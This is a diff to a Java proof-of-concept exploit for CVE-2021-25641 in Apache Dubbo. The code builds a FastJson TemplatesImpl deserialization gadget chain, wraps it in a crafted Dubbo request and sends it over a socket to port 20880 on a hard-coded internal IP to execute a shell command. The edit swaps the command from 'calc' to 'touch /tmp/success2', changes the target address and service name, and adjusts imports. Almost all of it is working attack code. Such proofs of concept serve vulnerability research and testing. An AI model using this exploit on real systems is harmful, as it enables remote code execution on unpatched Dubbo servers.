@@ -1,19 +1,16 @@
 package cve;
 
 import com.alibaba.fastjson.JSONObject;
+import com.sun.org.apache.xml.internal.serializer.utils.Utils;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.ObjectOutput;
 import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
 import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
-import org.nustaq.serialization.FSTConfiguration;
-import util.Utils;
+
 
 import java.io.ByteArrayOutputStream;
-
 import java.io.OutputStream;
-
 import java.net.Socket;
-
 import java.util.Random;
 
 public class CVE_2021_25641 {
@@ -22,11 +19,11 @@ public class CVE_2021_25641 {
 
     public static Object getGadgetsObj(String cmd) throws Exception{
         //Make TemplatesImpl
-        Object templates = Utils.createTemplatesImpl(cmd);
+        Object templates = util.Utils.createTemplatesImpl(cmd);
         //Make FastJson Gadgets Chain
         JSONObject jo = new JSONObject();
         jo.put("oops",templates);
-        return Utils.makeXStringToStringTrigger(jo);
+        return util.Utils.makeXStringToStringTrigger(jo);
     }
 
     public static void main(String[] args) throws Exception {
@@ -54,13 +51,13 @@ public class CVE_2021_25641 {
         // set request id.
         Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
         //Genaral ObjectOutput
-        objectOutput.writeUTF("2.7.1");
-        objectOutput.writeUTF("com.example.api.DemoService");
+        objectOutput.writeUTF("2.7.2");
+        objectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");
         objectOutput.writeUTF("");
         objectOutput.writeUTF("sayHello");
         objectOutput.writeUTF("Ljava/lang/String;"); //*/
 
-        objectOutput.writeObject(getGadgetsObj("calc"));
+        objectOutput.writeObject(getGadgetsObj("touch /tmp/success2"));
         objectOutput.writeObject(null);
         objectOutput.flushBuffer();
 
@@ -73,7 +70,7 @@ public class CVE_2021_25641 {
         byte[] bytes = byteArrayOutputStream.toByteArray();
 
         //Send Payload
-        Socket socket = new Socket("10.41.230.66", 20880);
+        Socket socket = new Socket("10.58.120.200", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
